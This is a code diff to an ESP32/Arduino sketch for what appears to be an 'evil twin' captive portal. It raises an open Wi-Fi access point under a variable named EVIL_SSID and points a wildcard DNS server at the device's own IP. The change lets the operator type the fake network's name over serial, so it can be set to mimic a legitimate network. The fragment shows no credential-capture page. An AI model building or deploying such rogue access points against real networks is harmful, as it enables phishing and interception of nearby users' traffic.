@@ -4,8 +4,8 @@
 #include <DNSServer.h>
 
 // ====== TUNE THESE ======
-const char* EVIL_SSID = "Hehe boii";
-const char* EVIL_PASS = "";
+std::string EVIL_SSID = "";
+std::string EVIL_PASS = "";
 // ========================
 
 IPAddress apIP(192,168,4,1);
@@ -58,12 +58,18 @@ void setup() {
   Serial.begin(115200);
   delay(500);
 
+  while(Serial.available() <= 0);
+  String temp = Serial.readStringUntil('\n');
+  temp.trim();
+  EVIL_SSID = temp.c_str();
+  Serial.printf("SSID set to %s\n", EVIL_SSID.c_str());
+
   // Bring up open AP
   WiFi.mode(WIFI_MODE_AP);
-  bool ok = WiFi.softAP(EVIL_SSID, EVIL_PASS); // open AP
+  bool ok = WiFi.softAP(EVIL_SSID.c_str(), EVIL_PASS.c_str()); // open AP
   if (!ok) Serial.println("[Portal] softAP failed");
   WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
-  Serial.printf("[Portal] AP up: %s | IP: %s\n", EVIL_SSID, WiFi.softAPIP().toString().c_str());
+  Serial.printf("[Portal] AP up: %s | IP: %s\n", EVIL_SSID.c_str(), WiFi.softAPIP().toString().c_str());
 
   // DNS: wildcard → our IP
   dns.start(DNS_PORT, "*", apIP);
